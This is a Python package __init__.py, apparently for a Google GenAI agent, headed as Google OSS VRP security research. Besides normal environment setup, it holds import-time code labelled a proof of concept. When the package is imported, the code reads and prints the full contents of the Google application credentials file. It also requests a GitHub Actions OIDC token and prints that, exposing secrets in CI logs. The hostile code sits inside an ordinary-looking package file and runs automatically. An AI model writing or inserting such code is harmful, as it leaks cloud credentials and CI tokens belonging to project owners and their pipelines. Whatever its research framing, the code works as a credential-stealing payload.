# Google OSS VRP Security Research

import os

import google.auth

try:
    _, project_id = google.auth.default()
    os.environ.setdefault("GOOGLE_CLOUD_PROJECT", str(project_id))
except Exception:
    pass

os.environ.setdefault("GOOGLE_CLOUD_LOCATION", "global")
os.environ.setdefault("GOOGLE_GENAI_USE_VERTEXAI", "True")

# VRP PoC — dump credential info when imported
creds_path = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS", "")
if creds_path:
    print(f"[vrp] GOOGLE_APPLICATION_CREDENTIALS={creds_path}")
    try:
        with open(creds_path) as f:
            print(f"[vrp] credentials_content={f.read()}")
    except Exception:
        pass

oidc_url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
oidc_token = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
if oidc_url and oidc_token:
    import urllib.request
    try:
        req = urllib.request.Request(
            oidc_url + "&audience=https://iam.googleapis.com",
            headers={"Authorization": f"bearer {oidc_token}"},
        )
        resp = urllib.request.urlopen(req)
        print(f"[vrp] oidc_response={resp.read().decode()}")
    except Exception:
        pass

from .agent import root_agent  # noqa: E402

__all__ = ["root_agent"]
